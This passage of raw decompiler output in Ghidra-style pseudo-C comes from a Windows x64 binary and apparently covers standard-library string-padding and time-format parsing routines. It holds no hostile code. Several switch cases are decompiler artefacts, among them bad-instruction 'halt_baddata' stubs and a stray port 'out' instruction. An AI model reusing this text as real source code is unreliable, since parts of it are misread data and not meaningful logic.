unaff_R14);\n                goto code_r0x000140044ee6;\n            }\n        }\n        fcn.1400bd360(0x14010b302);\n        ppiVar83 = unaff_R14;\ncode_r0x0001400454dc:\n        uVar58 = fcn.1400b7b60(0x14010b358, 0x14010b344, ppiVar83, ppiVar63);\n        fcn.1400bc860(uVar58);\n        (*(*arg1)[1])(arg1);\n        do {\n            uVar58 = fcn.1400bcd60();\n            fcn.1400bc860(uVar58);\n        } while( true );\n    case 0x6b:\n        in_stack_00000000 = &stack0x00000048;\n        puVar65 = &stack0x00000038;\n        in_stack_00000040 = NULL;\n        in_stack_00000048 = 0;\n        in_stack_00000049 = 0;\n        in_stack_00000038 = in_stack_00000000;\n        fcn.1400acbc0(puVar65, ppiVar60);\n        iVar80 = *(arg1 + 0xb);\n        uVar50 = unaff_R14 - iVar80;\n        unaff_RBP = uVar50;\n        uStack48 = puVar65;\n        if (0 < uVar50) {\n            if (iVar80 < 0) {\n                unaff_RBP = unaff_R14 & 0xffffffff;\n            }\n            uVar50 = unaff_RBP;\n            if (arg1[3] != NULL) {\n                unaff_R15 = uVar50 * 2;\n                in_stack_00000030 = in_stack_00000040;\n                goto code_r0x000140044e68;\n            }\n            ppiVar63 = unaff_RDI;\n            fcn.1400aa790(puVar65, 0, in_stack_00000040, unaff_RDI);\n            iVar80 = *(arg1 + 0xb);\n        }\n        goto code_r0x000140044ede;\n    case 0x6c:\n        ppiVar83 = unaff_RBX & 0xffffffff00000000 | ppiVar60 & 0xffffffff;\n        goto code_r0x000140044f34;\n    case 0x6d:\n        out(0xb0, uVar51);\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *0x18888d66c = *0x18888d66c + -0x10;\n        goto code_r0x000140044646;\n    case 0x6e:\n        goto code_r0x0001400445ec;\n    case 0x6f:\n        *unaff_RDI = *unaff_RDI + -0x10;\n        unaff_RDI = unaff_RBP * 2;\ncode_r0x0001400445bb:\n        *(puVar76 + 0x20) = 0;\n        iVar52 = unaff_RBP * 2;\n        *(puVar76 + -8) = 0x1400445dd;\n        fcn.1400ab0f0(*(puVar76 + 0x38), 0, unaff_R12, iVar52);\n        unaff_R15 = iVar52 + unaff_RDI;\n        unaff_R12 = *(puVar76 + 0xa0);\n        ppiVar63 = arg1[3];\n        puVar40 = puVar76;\n        ppiVar83 = unaff_R14;\ncode_r0x0001400445ec:\n        puVar75 = puVar40;\n        uVar50 = unaff_RBP;\n        piVar55 = arg1[2];\n        uVar48 = *(arg1 + 0x24);\n        *(puVar75 + 0x28) = unaff_R15;\n        *(puVar75 + 0x20) = unaff_RDI;\n        *(puVar75 + -8) = 0x140044606;\n        iVar52 = fcn.1400b6270(unaff_R12, uVar48, piVar55, ppiVar63);\n        ppiVar63 = *(puVar75 + 0xa8);\n        unaff_R14 = iVar52 - unaff_R12 >> 1;\n        if (ppiVar63 < unaff_R14) goto code_r0x000140044c3c;\n        *(puVar75 + 0xa8) = unaff_R14;\n        *(*(puVar75 + 0xa0) + (iVar52 - unaff_R12)) = 0;\n        iVar80 = *(arg1 + 0xb);\n        unaff_R12 = unaff_R14;\n        unaff_R14 = ppiVar83;\ncode_r0x00014004463e:\n        if (0 < iVar80) {\n            puVar56 = unaff_R12 + 1;\n            *(puVar75 + 0x50) = *(arg1 + 0x22);\n            iVar52 = *(puVar75 + 0xa0);\n            if (iVar52 == *(puVar75 + 0x68)) {\n                puVar67 = 0x7;\n            }\n            else {\n                puVar67 = *(puVar75 + 0xb0);\n            }\n            if (puVar67 < puVar56) {\n                *(puVar75 + 0x20) = 1;\n                *(puVar75 + -8) = 0x140044ba4;\n                fcn.1400aced0(*(puVar75 + 0x38), unaff_R12, 0, 0);\n                iVar52 = *(puVar75 + 0xa0);\n            }\n            ppiVar63 = NULL;\n            *(iVar52 + unaff_R12 * 2) = *(puVar75 + 0x50);\n            *(puVar75 + 0xa8) = puVar56;\n            *(iVar52 + 2 + unaff_R12 * 2) = 0;\n            if (uVar50 < 0) {\n                ppiVar60 = NULL;\n                ppiVar63 = -uVar50;\n                *(puVar75 + 0x20) = *(arg1 + 0x66);\n                *(puVar75 + -8) = 0x140044b2d;\n                fcn.1400ab0f0(*(puVar75 + 0x38), puVar56, 0, ppiVar63);\n                if (unaff_R14 <= 0x1fffffffffffffff - *(puVar75 + 0xa8)) goto code_r0x0001400449c9;\ncode_r0x000140044c18:\n                *(puVar75 + -8) = 0x140044c24;\n                fcn.1400bd360(0x14010b302);\ncode_r0x000140044c24:\n                *(puVar75 + -8) = 0x140044c30;\n                fcn.1400bd360(0x14010b302);\n                unaff_R14 = ppiVar60;\n            }\n            else {\n                unaff_R14 = *(arg1 + 0xb);\n                unaff_RDI = unaff_RDI + uVar50 * 2;\n                if (unaff_R14 <= 0x1fffffffffffffff - puVar56) {\ncode_r0x0001400449c9:\n                    *(puVar75 + -8) = 0x1400449d3;\n                    fcn.1400acd00(*(puVar75 + 0x38), unaff_RDI, unaff_R14);\n                    unaff_R12 = *(puVar75 + 0xa8);\n                    goto code_r0x000140044646;\n                }\n            }\n            *(puVar75 + -8) = 0x140044c3c;\n            fcn.1400bd360(0x14010b302);\ncode_r0x000140044c3c:\n            *(puVar75 + -8) = 0x140044c4f;\n            uVar58 = fcn.1400b7b60(0x14010b358, 0x14010b344, unaff_R14, ppiVar63);\n            *(puVar75 + -8) = 0x140044c57;\n            fcn.1400bc860(uVar58);\n            pcVar3 = (*arg1)[1];\n            *(puVar75 + -8) = 0x140044c60;\n            (*pcVar3)(arg1);\n            do {\n                *(puVar75 + -8) = 0x140044c65;\n                uVar58 = fcn.1400bcd60();\n                *(puVar75 + -8) = 0x140044c6d;\n                fcn.1400bc860(uVar58);\n            } while( true );\n        }\ncode_r0x000140044646:\n        uVar50 = *(unaff_RSI + 3);\n        *(puVar75 + 0x78) = uVar50 & 0xb0;\n        unaff_R15 = *(puVar75 + 0x40) + unaff_R12;\n        if ((uVar50 & 0x200) != 0) {\n            unaff_R15 = unaff_R15 + arg1[6];\n        }\n        puVar56 = puVar75 + 0xd0;\n        puVar65 = puVar75 + 0xc0;\n        ppiVar60 = NULL;\n        *(puVar75 + 200) = 0;\n        arg3 = unaff_R15 * 2;\ncode_r0x00014004468a:\n        *(puVar75 + 0x50) = puVar65;\n        *(puVar75 + 0x60) = puVar56;\n        *(puVar75 + 0xc0) = puVar56;\n        *(puVar75 + 0xd0) = ppiVar60;\n        *(puVar75 + -8) = 0x1400446aa;\n        fcn.1400acbc0(puVar65, arg3);\n        ppiVar83 = unaff_RSI[2];\n        puVar81 = puVar75 + 0x9c;\n        ppiVar78 = *(puVar75 + 200);\n        puVar75[0x7d] = *(puVar75 + 0x78) == 0x10 && unaff_R15 < ppiVar83;\n        do {\n            if (*puVar81 < 5) {\n                switch(*puVar81) {\n                case 0:\n                    if (puVar75[0x7d] != '\\0') {\ncode_r0x000140044807:\n                        ppiVar63 = ppiVar83 - unaff_R15;\n                        *(puVar75 + 0x20) = *(puVar75 + 0x4a);\n                        *(puVar75 + -8) = 0x140044826;\n                        fcn.1400ab0f0(*(puVar75 + 0x50), ppiVar78, 0, ppiVar63);\n                        goto code_r0x000140044860;\n                    }\n                    break;\n                case 1:\ncode_r0x0001400447a0:\n                    if (puVar75[0x7d] != '\\0') goto code_r0x000140044807;\n                    *(puVar75 + 0x70) = ppiVar78 + 1;\n                    iVar52 = *(puVar75 + 0xc0);\n                    if (iVar52 == *(puVar75 + 0x60)) {\n                        uVar59 = 7;\n                    }\n                    else {\n                        uVar59 = *(puVar75 + 0xd0);\n                    }\n                    if (uVar59 < *(puVar75 + 0x70)) {\n                        ppiVar63 = NULL;\n                        *(puVar75 + 0x20) = 1;\n                        *(puVar75 + -8) = 0x140044bd4;\n                        fcn.1400aced0(*(puVar75 + 0x50), ppiVar78, 0, 0);\n                        iVar52 = *(puVar75 + 0xc0);\n                    }\n                    ppiVar60 = *(puVar75 + 0x70);\n                    *(iVar52 + ppiVar78 * 2) = *(puVar75 + 0x4a);\n                    *(puVar75 + 200) = ppiVar60;\n                    *(iVar52 + 2 + ppiVar78 * 2) = 0;\n                    ppiVar78 = ppiVar60;\n                    break;\n                case 2:\n                    if ((*(unaff_RSI + 0x19) & 2) != 0) {\n                        ppiVar60 = arg1[6];\n                        piVar55 = arg1[5];\n                        if (ppiVar60 <= 0x1fffffffffffffff - ppiVar78) goto code_r0x000140044856;\n                        *(puVar75 + -8) = 0x14004479c;\n                        fcn.1400bd360(0x14010b302);\n                        goto code_r0x0001400447a0;\n                    }\n                    break;\n                case 3:\n                    if (*(puVar75 + 0x40) != 0) {\n                        *(puVar75 + 0x7e) = **(puVar75 + 0x58);\n                        *(puVar75 + 0x70) = ppiVar78 + 1;\n                        iVar52 = *(puVar75 + 0xc0);\n                        if (iVar52 == *(puVar75 + 0x60)) {\n                            uVar59 = 7;\n                        }\n                        else {\n                            uVar59 = *(puVar75 + 0xd0);\n                        }\n                        if (uVar59 < *(puVar75 + 0x70)) {\n                            ppiVar63 = NULL;\n                            *(puVar75 + 0x20) = 1;\n                            *(puVar75 + -8) = 0x140044b74;\n                            fcn.1400aced0(*(puVar75 + 0x50), ppiVar78, 0, 0);\n                            iVar52 = *(puVar75 + 0xc0);\n                        }\n                        *(iVar52 + ppiVar78 * 2) = *(puVar75 + 0x7e);\n                        ppiVar60 = *(puVar75 + 0x70);\n                        *(puVar75 + 200) = ppiVar60;\n                        *(iVar52 + 2 + ppiVar78 * 2) = 0;\n                        ppiVar78 = ppiVar60;\n                    }\n                    break;\n                case 4:\n                    ppiVar60 = *(puVar75 + 0xa8);\n                    piVar55 = *(puVar75 + 0xa0);\n                    if (0x1fffffffffffffff - ppiVar78 < ppiVar60) {\n                        *(puVar75 + -8) = 0x140044c18;\n                        fcn.1400bd360(0x14010b302);\n                        goto code_r0x000140044c18;\n                    }\ncode_r0x000140044856:\n                    *(puVar75 + -8) = 0x140044860;\n                    fcn.1400acd00(*(puVar75 + 0x50), piVar55, ppiVar60);\ncode_r0x000140044860:\n                    ppiVar78 = *(puVar75 + 200);\n                }\n            }\n            puVar81 = puVar81 + 1;\n        } while (*(puVar75 + 0x38) != puVar81);\n        if (1 < *(puVar75 + 0x40)) {\n            ppiVar60 = *(puVar75 + 0x40) - 1;\n            if (0x1fffffffffffffff - ppiVar78 < ppiVar60) goto code_r0x000140044c24;\n            *(puVar75 + -8) = 0x140044a10;\n            fcn.1400acd00(*(puVar75 + 0x50), *(puVar75 + 0x58) + 2, ppiVar60);\n            ppiVar78 = *(puVar75 + 200);\n        }\n        if (ppiVar78 < ppiVar83) {\n            *(puVar75 + 0x20) = *(puVar75 + 0x4c);\n            if (*(puVar75 + 0x78) == 0x20) {\n                *(puVar75 + -8) = 0x140044a2d;\n                fcn.1400ab0f0(*(puVar75 + 0x50), ppiVar78, 0, ppiVar83 - ppiVar78);\n                ppiVar78 = ppiVar83;\n            }\n            else {\n                *(puVar75 + -8) = 0x1400448b7;\n                fcn.1400ab0f0(*(puVar75 + 0x50), 0, 0, ppiVar83 - ppiVar78);\n                ppiVar78 = ppiVar83;\n            }\n        }\n        iVar52 = *(puVar75 + 0xc0);\n        uVar59 = unaff_R13 & 0xffffffff;\n        if (unaff_R13 == '\\0') {\n            pcVar3 = *(**(puVar75 + 0x30) + 0x60);\n            *(puVar75 + -8) = 0x1400448db;\n            iVar57 = (*pcVar3)(*(puVar75 + 0x30), iVar52, ppiVar78);\n            iVar52 = *(puVar75 + 0xc0);\n            if (ppiVar78 != iVar57) {\n                uVar59 = 1;\n            }\n        }\n        *(puVar75 + 0x88) = uVar59 & 0xff;\n        unaff_R13 = unaff_R13 & 0xffffffffffffff00 | uVar59 & 0xff;\n        *(puVar75 + 0x80) = *(puVar75 + 0x30);\n        if (iVar52 != *(puVar75 + 0x60)) {\n            *(puVar75 + -8) = 0x14004491b;\n            fcn.1400bc6c0(iVar52);\n        }\n        if (*(puVar75 + 0xa0) != *(puVar75 + 0x68)) {\n            *(puVar75 + -8) = 0x140044936;\n            fcn.1400bc6c0();\n        }\ncode_r0x0001400444ee:\n        ppiVar63 = *(puVar75 + 0x130);\n        unaff_RSI[2] = NULL;\n        piVar55 = *(puVar75 + 0x30);\n        ppiVar63[1] = unaff_R13;\n        *ppiVar63 = piVar55;\n        return ppiVar63;\n    case 0x70:\n        puVar75 = &stack0xffffffffffffff90;\n        puVar76 = &stack0xffffffffffffff90;\n        if ((ppiVar60 & 0x40) != 0) {\n            unaff_RDI = unaff_RDI + 2;\n        }\n        ppiVar63 = unaff_RDI + (ppiVar60 & 0xffffffffffffff40) * 2;\n        uStack120 = 0x1400444e3;\n        iVar52 = (**(*unaff_RBP + 0x28))(uVar58);\n        unaff_R14 = iVar52 - unaff_RDI >> 1;\n        if (unaff_R14 == NULL) goto code_r0x0001400444ee;\n        in_stack_00000030 = &stack0x00000040;\n        in_stack_00000038 = NULL;\n        in_stack_00000040 = in_stack_00000040 & 0xffffffffffff0000;\n        uStack120 = 0x140044592;\n        fcn.1400acbc0(&stack0x00000030, iVar52 - unaff_RDI);\n        iVar80 = *(arg1 + 0xb);\n        uVar50 = unaff_R14 - iVar80;\n        unaff_RBP = uVar50;\n        puVar75 = &stack0xffffffffffffff90;\n        unaff_R12 = in_stack_00000038;\n        if (0 < uVar50) {\n            if (iVar80 < 0) {\n                unaff_RBP = unaff_R14 & 0xffffffff;\n            }\n            uVar50 = unaff_RBP;\n            if (arg1[3] != NULL) goto code_r0x0001400445bb;\n            iStack80 = uVar50;\n            uStack120 = 0x140044afa;\n            ppiVar63 = unaff_RDI;\n            fcn.1400aa790(&stack0x00000030, 0, in_stack_00000038, unaff_RDI);\n            iVar80 = *(arg1 + 0xb);\n            puVar75 = &stack0xffffffffffffff90;\n            unaff_R12 = in_stack_00000038;\n        }\n        goto code_r0x00014004463e;\n    case 0x71:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        puVar81 = arg1 + -0x73;\n        uVar87 = *puVar81;\n        *puVar81 = *puVar81 - 0x10;\n        puVar56 = ppiVar60 & 0xffffffffffffff00 | uVar44 + 0x3f + (0xf < uVar87);\n        puVar75 = auStack104;\n        ppiVar60 = in_stack_00000030;\n        goto code_r0x00014004468a;\n    case 0x72:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x73:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x74:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x75:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x76:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x77:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x78:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x79:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7b:\n        puVar72 = auStack104;\ncode_r0x00014003a712:\n        *(puVar72 + 0x130) = in_XMM1_Da;\n        *(puVar72 + 0x134) = in_XMM1_Db;\n        *(puVar72 + 0x138) = in_XMM1_Dc;\n        *(puVar72 + 0x13c) = in_XMM1_Dd;\n        in_XMM1_Da = *(puVar72 + 0xc0);\n        in_XMM1_Db = *(puVar72 + 0xc4);\n        in_XMM1_Dc = *(puVar72 + 200);\n        in_XMM1_Dd = *(puVar72 + 0xcc);\n        *(puVar72 + 0x98) = ppiVar60;\n        *(puVar72 + 0x40) = puVar72 + 0xd8;\n        *(puVar72 + 0x90) = unaff_RDI;\n        *(puVar72 + 0x38) = *(puVar72 + 0x270);\n        *(puVar72 + 0x28) = puVar72 + 0xe0;\ncode_r0x00014003a75a:\n        *(puVar72 + 0x20) = puVar72 + 0xdc;\n        *(puVar72 + 0xe0) = in_XMM6_Da;\n        *(puVar72 + 0xe4) = in_XMM6_Db;\n        *(puVar72 + 0xe8) = in_XMM6_Dc;\n        *(puVar72 + 0xec) = in_XMM6_Dd;\n        *(puVar72 + 0xf0) = in_XMM5_Da;\n        *(puVar72 + 0xf4) = in_XMM5_Db;\n        *(puVar72 + 0xf8) = in_XMM5_Dc;\n        *(puVar72 + 0xfc) = in_XMM5_Dd;\n        *(puVar72 + 0x100) = in_XMM4_Da;\n        *(puVar72 + 0x104) = in_XMM4_Db;\n        *(puVar72 + 0x108) = in_XMM4_Dc;\n        *(puVar72 + 0x10c) = in_XMM4_Dd;\n        *(puVar72 + 0x110) = in_XMM3_Da;\n        *(puVar72 + 0x114) = in_XMM3_Db;\n        *(puVar72 + 0x118) = in_XMM3_Dc;\n        *(puVar72 + 0x11c) = in_XMM3_Dd;\n        *(puVar72 + 0x120) = puVar91;\n        *(puVar72 + 0x128) = puVar92;\n        *(puVar72 + 0x140) = auVar90;\n        *(puVar72 + 0xa0) = in_XMM1_Da;\n        *(puVar72 + 0xa4) = in_XMM1_Db;\n        *(puVar72 + 0xa8) = in_XMM1_Dc;\n        *(puVar72 + 0xac) = in_XMM1_Dd;\n        *(puVar72 + -8) = 0x14003a7a4;\n        fcn.140038e30(puVar65, arg3, in_stack_00000030, in_stack_00000038, *(puVar72 + 0x20), *(puVar72 + 0x28), \n                      *(puVar72 + 0x30), *(puVar72 + 0x38), *(puVar72 + 0x40), *(puVar72 + 0x48), *(puVar72 + 0x50), \n                      *(puVar72 + 0x58), *(puVar72 + 0x60), *(puVar72 + 0x68), *(puVar72 + 0x70), *(puVar72 + 0x78), \n                      *(puVar72 + 0x80));\n        unaff_R13 = *(puVar72 + 0xb0);\n        unaff_RSI = *(puVar72 + 0xb8);\n        *(puVar72 + 0xc0) = unaff_R13;\n        *(puVar72 + 200) = *(puVar72 + 0xb8);\n        *(puVar72 + 100) = *(puVar72 + 0xd8);\n        if (*(puVar72 + 0xd8) == 0) {\n            *(*(puVar72 + 0x280) + 0x18) = *(puVar72 + 0xdc) % 7;\n            **(puVar72 + 0x290) = **(puVar72 + 0x290) | 2;\n        }\ncode_r0x000140039f81:\n        *(puVar72 + 0x58) = *(puVar72 + 0x58) + 1;\n        iStack0000000000000060 = unaff_RSI;\n        puVar67 = puVar72;\njoined_r0x000140039e52:\n        uVar88 = iStack0000000000000060 == -1;\n        uVar44 = uVar88;\n        if ((unaff_R13 != NULL) && (uVar88)) {\n            unaff_R15 = uVar88;\n            if (*(unaff_R13 + 0x10) < *(unaff_R13 + 0x18)) {\n                iVar46 = **(unaff_R13 + 0x10);\n            }\n            else {\ncode_r0x00014003a3b0:\n                uVar44 = unaff_R15;\n                pcVar3 = (*unaff_R13)[9];\n                *(puVar67 + -8) = 0x14003a3ba;\n                iVar46 = (*pcVar3)(unaff_R13);\n            }\n            if (iVar46 == -1) {\n                *(puVar67 + 0xc0) = 0;\n            }\n            uVar88 = iVar46 == -1;\n            bVar86 = unaff_RDI != NULL & arg1;\n            puVar72 = puVar67;\n            if (bVar86 != false) goto code_r0x000140039fd8;\ncode_r0x000140039e73:\n            if (uVar88 != arg1) goto code_r0x000140039e7e;\ncode_r0x00014003a010:\n            ppiVar63 = *(puVar72 + 0x250);\n            puVar85 = *(puVar72 + 0x278);\n            if ((*(puVar72 + 0x58) == *(puVar72 + 0x68)) && (*(puVar72 + 100) == 0)) goto code_r0x00014003a03b;\ncode_r0x00014003a037:\n            *puVar85 = *puVar85 | 4;\ncode_r0x00014003a03b:\n            uVar2 = *(puVar72 + 0xc4);\n            uVar6 = *(puVar72 + 200);\n            uVar7 = *(puVar72 + 0xcc);\n            *ppiVar63 = *(puVar72 + 0xc0);\n            *(ppiVar63 + 4) = uVar2;\n            *(ppiVar63 + 1) = uVar6;\n            *(ppiVar63 + 0xc) = uVar7;\n            return ppiVar63;\n        }\n        bVar86 = unaff_RDI != NULL & arg1;\n        puVar72 = puVar67;\n        if (bVar86 == false) goto code_r0x000140039e73;\ncode_r0x000140039fd8:\n        if (unaff_RDI[2] < unaff_RDI[3]) {\n            iVar46 = *unaff_RDI[2];\n        }\n        else {\n            pcVar3 = (*unaff_RDI)[9];\n            *(puVar72 + -8) = 0x14003a3a1;\n            iVar46 = (*pcVar3)(unaff_RDI);\n        }\n        if (iVar46 == -1) {\n            unaff_RDI = NULL;\n        }\n        else {\n            bVar86 = false;\n        }\n        if (uVar88 == bVar86) goto code_r0x00014003a010;\ncode_r0x000140039e7e:\n        iVar46 = unaff_RSI;\n        if (*(puVar72 + 0x68) <= *(puVar72 + 0x58)) goto code_r0x00014003a010;\n        if (*(puVar72 + 100) != 0) {\n            ppiVar63 = *(puVar72 + 0x250);\n            puVar85 = *(puVar72 + 0x278);\n            goto code_r0x00014003a037;\n        }\n        uVar58 = *(puVar72 + 0x58);\n        pcVar3 = (*unaff_R12)[0xc];\n        *(puVar72 + -8) = 0x140039ebf;\n        cVar43 = (*pcVar3)(unaff_R12);\n        if (cVar43 != '%') goto code_r0x000140039ec7;\n        pcVar3 = (*unaff_R12)[0xc];\n        *(puVar72 + -8) = 0x14003a0b2;\n        cVar43 = (*pcVar3)(unaff_R12);\n        *(puVar72 + 0xdc) = 0;\n        if ((cVar43 == 'E') || (cVar43 == 'O')) {\n            *(puVar72 + 0x58) = *(puVar72 + 0x58) + 2;\n            pcVar3 = (*unaff_R12)[0xc];\n            *(puVar72 + -8) = 0x14003a288;\n            cVar43 = (*pcVar3)(unaff_R12);\n        }\n        else {\n            *(puVar72 + 0x58) = *(puVar72 + 0x58) + 1;\n        }\n        uVar50 = (uVar58 * 2 & 0xffffff00U | unaff_RDI != NULL) & arg1;\n        unaff_RBP = uVar50;\n        puVar71 = puVar72;\n        switch(cVar43 + -0x25) {\n        case '\\0':\n            unaff_R13 = *(puVar72 + 0xc0);\n            if ((unaff_R13 != NULL) && (uVar44 != 0)) {\n                if (unaff_R13[2] < unaff_R13[3]) {\n                    iVar46 = *unaff_R13[2];\n                }\n                else {\n                    pcVar3 = (*unaff_R13)[9];\n                    *(puVar72 + -8) = 0x14003be0a;\n                    iVar46 = (*pcVar3)(unaff_R13);\n                }\n                if (iVar46 == -1) {\n                    *(puVar72 + 0xc0) = 0;\n                    unaff_R13 = NULL;\n                }\n            }\n            pcVar3 = (*unaff_R12)[10];\n            *(puVar72 + -8) = 0x14003a91d;\n            iVar47 = (*pcVar3)(unaff_R12);\n            if (iVar47 == iVar46) goto code_r0x00014003a100;\n            *(puVar72 + 0xd8) = 4;\n            *(puVar72 + 100) = 4;\n            goto code_r0x000140039f81;\n        default:\n            goto code_r0x000140039f66;\n        case '\\x1c':\n        case '<':\n            goto code_r0x00014003a6a9;\n        case '\\x1d':\n        case '=':\n        case 'C':\n            in_stack_00000038 = puVar72 + 0x90;\n            puVar65 = puVar72 + 0xb0;\n            in_stack_00000030 = puVar72 + 0xa0;\n            iVar52 = *(*(puVar72 + 0x80) + 0x10);\n            uVar2 = *(iVar52 + 0x15c);\n            uVar6 = *(iVar52 + 0x160);\n            uVar7 = *(iVar52 + 0x164);\n            uVar8 = *(iVar52 + 0x128);\n            uVar9 = *(iVar52 + 300);\n            uVar10 = *(iVar52 + 0x130);\n            uVar11 = *(iVar52 + 0x134);\n            uVar12 = *(iVar52 + 0x138);\n            uVar13 = *(iVar52 + 0x13c);\n            uVar14 = *(iVar52 + 0x140);\n            uVar15 = *(iVar52 + 0x144);\n            uVar16 = *(iVar52 + 0x148);\n            uVar17 = *(iVar52 + 0x14c);\n            uVar18 = *(iVar52 + 0x150);\n            uVar19 = *(iVar52 + 0x154);\n            uVar20 = *(iVar52 + 0x168);\n            uVar21 = *(iVar52 + 0x16c);\n            uVar22 = *(iVar52 + 0x170);\n            uVar23 = *(iVar52 + 0x174);\n            uVar24 = *(iVar52 + 0x178);\n            uVar25 = *(iVar52 + 0x17c);\n            uVar26 = *(iVar52 + 0x180);\n            uVar27 = *(iVar52 + 0x184);\n            in_XMM7_Da = *(iVar52 + 0x108);\n            in_XMM7_Db = *(iVar52 + 0x10c);\n            in_XMM7_Dc = *(iVar52 + 0x110);\n            in_XMM7_Dd = *(iVar52 + 0x114);\n            in_XMM6_Da = *(iVar52 + 0x118);\n            in_XMM6_Db = *(iVar52 + 0x11c);\n            in_XMM6_Dc = *(iVar52 + 0x120);\n            in_XMM6_Dd = *(iVar52 + 0x124);\n            uVar28 = *(iVar52 + 0xd8);\n            uVar29 = *(iVar52 + 0xdc);\n            uVar30 = *(iVar52 + 0xe0);\n            uVar31 = *(iVar52 + 0xe4);\n            uVar32 = *(iVar52 + 0xe8);\n            uVar33 = *(iVar52 + 0xec);\n            uVar34 = *(iVar52 + 0xf0);\n            uVar35 = *(iVar52 + 0xf4);\n            in_XMM8_Da = *(iVar52 + 0xf8);\n            in_XMM8_Db = *(iVar52 + 0xfc);\n            in_XMM8_Dc = *(iVar52 + 0x100);\n            in_XMM8_Dd = *(iVar52 + 0x104);\n            uVar36 = *(iVar52 + 200);\n            uVar37 = *(iVar52 + 0xcc);\n            uVar38 = *(iVar52 + 0xd0);\n            uVar39 = *(iVar52 + 0xd4);\n            *(puVar72 + 0x170) = *(iVar52 + 0x158);\n            *(puVar72 + 0x174) = uVar2;\n            *(puVar72 + 0x178) = uVar6;\n            *(puVar72 + 0x17c) = uVar7;\n            *(puVar72 + 0x140) = uVar8;\n            *(puVar72 + 0x144) = uVar9;\n            *(puVar72 + 0x148) = uVar10;\n            *(puVar72 + 0x14c) = uVar11;\n            *(puVar72 + 0x150) = uVar12;\n            *(puVar72 + 0x154) = uVar13;\n            *(puVar72 + 0x158) = uVar14;\n            *(puVar72 + 0x15c) = uVar15;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x160) = uVar16;\n            *(puVar72 + 0x164) = uVar17;\n            *(puVar72 + 0x168) = uVar18;\n            *(puVar72 + 0x16c) = uVar19;\n            *(puVar72 + 0x180) = uVar20;\n            *(puVar72 + 0x184) = uVar21;\n            *(puVar72 + 0x188) = uVar22;\n            *(puVar72 + 0x18c) = uVar23;\n            *(puVar72 + 400) = uVar24;\n            *(puVar72 + 0x194) = uVar25;\n            *(puVar72 + 0x198) = uVar26;\n            *(puVar72 + 0x19c) = uVar27;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0x40) = puVar72 + 0xd8;\n            *(puVar72 + 0xe0) = uVar36;\n            *(puVar72 + 0xe4) = uVar37;\n            *(puVar72 + 0xe8) = uVar38;\n            *(puVar72 + 0xec) = uVar39;\n            *(puVar72 + 0xf0) = uVar28;\n            *(puVar72 + 0xf4) = uVar29;\n            *(puVar72 + 0xf8) = uVar30;\n            *(puVar72 + 0xfc) = uVar31;\n            *(puVar72 + 0x100) = uVar32;\n            *(puVar72 + 0x104) = uVar33;\n            *(puVar72 + 0x108) = uVar34;\n            *(puVar72 + 0x10c) = uVar35;\ncode_r0x00014003a4c5:\n            *(puVar72 + 0x110) = in_XMM8_Da;\n            *(puVar72 + 0x114) = in_XMM8_Db;\n            *(puVar72 + 0x118) = in_XMM8_Dc;\n            *(puVar72 + 0x11c) = in_XMM8_Dd;\n            *(puVar72 + 0x120) = in_XMM7_Da;\n            *(puVar72 + 0x124) = in_XMM7_Db;\n            *(puVar72 + 0x128) = in_XMM7_Dc;\n            *(puVar72 + 300) = in_XMM7_Dd;\n            *(puVar72 + 0x130) = in_XMM6_Da;\n            *(puVar72 + 0x134) = in_XMM6_Db;\n            *(puVar72 + 0x138) = in_XMM6_Dc;\n            *(puVar72 + 0x13c) = in_XMM6_Dd;\n            *(puVar72 + 0x30) = 0x18;\n            *(puVar72 + 0x38) = *(puVar72 + 0x270);\n            *(puVar72 + 0x28) = puVar72 + 0xe0;\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + -8) = 0x14003a51b;\n            fcn.140038e30(puVar65, *(puVar72 + 600), in_stack_00000030, in_stack_00000038, *(puVar72 + 0x20), \n                          *(puVar72 + 0x28), *(puVar72 + 0x30), *(puVar72 + 0x38), *(puVar72 + 0x40), *(puVar72 + 0x48)\n                          , *(puVar72 + 0x50), *(puVar72 + 0x58), *(puVar72 + 0x60), *(puVar72 + 0x68), \n                          *(puVar72 + 0x70), *(puVar72 + 0x78), *(puVar72 + 0x80));\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                *(*(puVar72 + 0x280) + 0x10) = *(puVar72 + 0xdc) % 0xc;\n                **(puVar72 + 0x290) = **(puVar72 + 0x290) | 0x408;\n            }\n            goto code_r0x000140039f81;\n        case '\\x1e':\n            *(puVar72 + 0x30) = 99;\n            *(puVar72 + 0x28) = 0;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            *(puVar72 + 0x38) = 2;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            